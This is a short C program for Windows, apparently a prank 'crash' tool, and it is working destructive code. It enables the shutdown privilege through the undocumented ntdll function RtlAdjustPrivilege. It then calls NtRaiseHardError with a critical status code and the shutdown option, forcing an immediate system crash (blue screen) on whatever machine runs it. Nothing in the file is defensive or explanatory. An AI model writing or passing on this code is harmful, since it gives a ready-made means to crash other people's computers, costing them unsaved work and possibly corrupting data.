#include "water_is_dangerous_Crash.h"
#include <Windows.h>
typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
}UNICODE_STRING, * PUNICODE_STRING;

typedef enum _HARDERROR_RESPONSE_OPTION
{
	OptionAbortRetryIgnore,
	OptionOk,
	OptionOkCancel,
	OptionRetryCancel,
	OptionYesNo,
	OptionYesNoCancel,
	OptionShutdownSystem
} HARDERROR_RESPONSE_OPTION, * PHARDERROR_RESPONSE_OPTION;

typedef enum _HARDERROR_RESPONSE
{
	ResponseReturnToCaller,
	ResponseNotHandled,
	ResponseAbort,
	ResponseCancel,
	ResponseIgnore,
	ResponseNo,
	ResponseOk,
	ResponseRetry,
	ResponseYes
} HARDERROR_RESPONSE, * PHARDERROR_RESPONSE;

typedef UINT(CALLBACK* NtRaiseHardError)(NTSTATUS, ULONG, PUNICODE_STRING, PVOID, HARDERROR_RESPONSE_OPTION, PHARDERROR_RESPONSE);
typedef UINT(CALLBACK* RtlAdjustPrivilege)(ULONG, BOOL, BOOL, PINT);

int main() {
	HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
	if (hNtdll == NULL) {
		return -1;
	}
	int nen = 0;
	LUID luidPriv;
	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &luidPriv);
	RtlAdjustPrivilege funcRtlAdjustPrivilege = (RtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
	funcRtlAdjustPrivilege(luidPriv.LowPart, TRUE, FALSE, &nen);
	NtRaiseHardError funcNtRaiseHardError = (NtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");
	FreeLibrary(hNtdll);
	HARDERROR_RESPONSE resp;
	funcNtRaiseHardError(0xc000021a, 0, NULL, NULL, OptionShutdownSystem, &resp);
	return 0;
}